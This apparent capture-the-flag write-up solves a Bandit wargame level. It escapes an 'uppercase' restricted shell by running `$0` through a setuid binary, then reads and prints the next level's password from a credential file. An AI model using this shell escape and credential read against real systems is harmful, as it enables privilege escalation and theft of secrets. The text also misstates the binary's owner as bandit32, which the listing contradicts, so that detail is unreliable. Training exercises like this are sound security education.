## Bandit Level 33 — UPPERCASE SHELL

### Description

After all this git stuff, it’s time for another escape. Good luck!

### Walkthrough

After login, we immediately get to a custom shell apparently called `UPPERCASE SHELL`:
```bash
WELCOME TO THE UPPERCASE SHELL
>>
```
When typing commands like `ls` or `bash`, the shell automatically converts them to uppercase — which fails because Linux is case-sensitive:
```bash
>> cat
sh: 1: CAT: Permission denied
>> ls
sh: 1: LS: Permission denied
```
The current shell’s executable is referenced by `$0`. Since `$0` already contains the correct lowercase path, we can just run:
```bash
>> $0
```
Now we get the `sh` shell:
```bash
$ ls -l
total 16
-rwsr-x--- 1 bandit33 bandit32 15140 Apr 10 14:23 uppershell
$
```
That is interesting; Because it has the setuid bit set. This means that when this binary is executed, it runs with the privileges of the file owner (in this case, `bandit32`), not the user who executed it (`bandit33`). Since we already get the shell through this binary, we have the privilege escalation:
```bash
$ whoami
bandit33
```
Nice! Now all we have to do is to read the password for the next level:
```bash
$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
```